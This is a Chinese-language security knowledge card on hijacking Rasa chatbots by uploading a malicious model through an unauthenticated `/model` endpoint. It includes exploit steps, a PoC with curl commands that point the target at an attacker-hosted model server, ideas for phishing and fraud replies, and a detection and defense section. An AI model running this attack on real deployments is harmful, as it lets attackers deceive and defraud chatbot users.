---
id: web-python-framework-rasa-malicious-model-dialogue-hijack
title: Rasa 未授权上传恶意模型替换对话内容
type: scenario
domain: web
path: web/python/framework
technique: malicious-model-replacement
aliases:
- Rasa 模型替换
- 对话机器人劫持
- /model 上传恶意模型
- model.tar.gz 覆盖
tags:
- python
- rasa
- model-upload
- integrity
- chatbot
- social-engineering
- cve-2021-41127
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: Rasa 3.6.21（原文实测）
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:58:15+08:00'
  notes: CVE 归属已澄清，按技术卡通过；上传恶意模型→/status 变化→webhook 返回 PWNED_BY_CTF 已在原文与截图 32-36 验证
---

## 一句话结论

Rasa 的 `/model` 接口会把调用方提供的模型直接设为当前对话模型，且不校验模型来源与内容；攻击者用 `rasa init/train` 训练一个带恶意规则和回复的模型并上传，即可让线上机器人对所有用户返回攻击者预设的内容。

## 原理

- Rasa 的模型 tar.gz 包含 `domain`、NLU 训练数据、对话规则/策略等；加载后 `MessageProcessor` 用该模型处理后续用户消息。
- `/model` 支持 `model_server`/`remote_storage`/`model_file` 三种来源，最终调用 `load_agent()` → `agent.load_model()` 切换当前 agent，成功返回 204 No Content。
- 模型格式本身是“数据 + 规则”，回复文本（`responses.utter_*`）完全由模型决定；没有签名、来源校验或内容审核，因此恶意模型与正常模型无法区分。
- 恶意规则可把常见意图（如 `greet`）映射到攻击者指定回复，普通用户输入 `hello` 即触发，达到对话劫持/内容投毒的效果。
- 原文同时指出原 CVE 的危害面是恶意 `model.tar.gz` 覆盖/替换 bot 目录中的 bot 文件；本文演示的最终危害是对话内容被替换，二者都源于模型文件缺乏可信校验。

## 触发条件

- Rasa 以 `--enable-api` 启动，`/model` 可达。
- 未配置鉴权（未授权即可），或攻击者持有有效 Token/JWT。
- 攻击者可访问一个能被 Rasa 拉取的 HTTP 服务，用于投递自训练模型（`model_server` 路径）。
- 目标 Rasa 版本接受外部模型（原文称 2.8.10 已修复；作者在 3.6.21 仍复现上传替换，存在版本标记冲突）。

## 利用步骤

1. 本地安装同版本 Rasa，`rasa init` 初始化项目。
2. 把 `domain.yml`/NLU 数据/`rules.yml` 改为恶意内容：让 `greet` 意图返回攻击者文案。
3. `rasa train` 生成 `models/*.tar.gz`。
4. 用伪造模型服务器提供该 tar，并返回 `ETag` 以满足“有新模型”的判断。
5. `PUT /model` 指向该服务器；返回 204 表示模型已切换。
6. 访问 `GET /status` 确认 `model_file` 已变；再以普通用户调用 `POST /webhooks/rest/webhook`，输入 `hello` 得到攻击者回复。

## PoC

恶意训练数据（最小示例）：

```yaml
version: "3.1"
intents:
- greet
responses:
  utter_greet:
  - text: "PWNED_BY_CTF"
nlu:
- intent: greet
  examples: |
    - hello
    - hi
rules:
- rule: greet rule
  steps:
  - intent: greet
  - action: utter_greet
```

训练并投递：

```bash
rasa init
# 将上面的内容写入 domain.yml / data/*.yml / rules.yml 后
rasa train
# 取 models/<timestamp>-<name>.tar.gz，用模型服务器提供给目标
```

```bash
curl -X PUT http://target:5005/model \
  -H 'Content-Type: application/json' \
  -d '{"model_server":{"url":"http://attacker:5000/stage2-probe-model","wait_time_between_pulls":0}}'
# 204 No Content

curl -s http://target:5005/webhooks/rest/webhook \
  -H 'Content-Type: application/json' \
  -d '{"sender":"rulecheck","message":"hello"}'
# [{"recipient_id":"rulecheck","text":"PWNED_BY_CTF"}]
```

## 变体与关联

- 变体：回复内容可替换为钓鱼链接、虚假客服话术、转账指引等，用于社工与诈骗；也可用规则把用户引导到攻击者控制的 external action。
- 变体：若 `model_file` 可指定服务器本地路径，配合任意文件写入可免去外部模型服务器。
- 关联：同一 `/model` 接口的动态导入链可进一步升级为 RCE（见 Rasa metadata 动态导入卡）。
- 关联卡片：[[web-python-framework-rasa-model-metadata-importlib-rce]]、[[web-python-framework-rasa-model-server-filename-path-traversal]]

## 检测与防御

- 检测：`/model` 请求来自非运维来源，或 `model_server.url` 指向外部地址；模型文件名/指纹突变。
- 检测：`/status` 中 `model_file` 在非发布窗口发生变化；对话回复出现异常固定文案、外链。
- 检测：模型加载后 NLU/规则与基线差异过大（意图-回复映射突变），可做模型指纹与内容基线比对。
- 修复：`/model` 强制鉴权并限制来源；模型发布走签名/哈希校验，只允许可信制品；升级到修复版本。
- 加固：生产环境关闭不必要的 `--enable-api`；模型目录只读；把模型发布纳入 CI 与审计，禁止运行时任意替换。

## CVE 归属说明

该技术链与 CVE-2021-41127 的实际向量（恶意 model.tar.gz 覆盖 bot 目录文件）不同，卡片不将其作为该 CVE 的复现；CVE 字段已清空，CVE 库不登记该映射。
